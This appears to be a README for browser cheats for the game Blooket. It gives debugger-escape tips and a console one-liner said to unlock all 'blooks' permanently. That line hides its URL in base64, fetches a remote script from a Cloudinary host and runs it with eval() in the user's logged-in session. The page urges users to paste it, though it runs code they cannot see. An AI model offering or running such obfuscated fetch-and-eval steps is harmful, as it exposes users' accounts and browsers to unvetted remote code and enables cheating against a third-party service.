# Paused in debugger
if you run one of the codes and get this: ![image](https://user-images.githubusercontent.com/73669084/133943133-af7cc9b8-75ab-496c-a17e-5851b6d7ff63.png) don't worry all you have to do is go to the sources tab: ![image](https://user-images.githubusercontent.com/73669084/133943102-701b0737-b0ca-4ccd-b533-e782c7767447.png) and click this: ![image](https://user-images.githubusercontent.com/73669084/133943169-2897f143-258f-49d8-81e3-181ffe857c8e.png) top right, lastly click this: ![image](https://user-images.githubusercontent.com/73669084/133943122-bc762f73-8522-435a-abb8-905233c95ebe.png) to get out of debugger


# unlockAllBlooksPermanetly.js
Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob("aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZG0yaG9hNDVxL3Jhdy91cGxvYWQvdjE2Mzg1NjczNzkvdW5sb2NrQWxsUGVybV9iZW5peTMuanM=")).then((res) => res.text().then((t) => eval(t)))
```
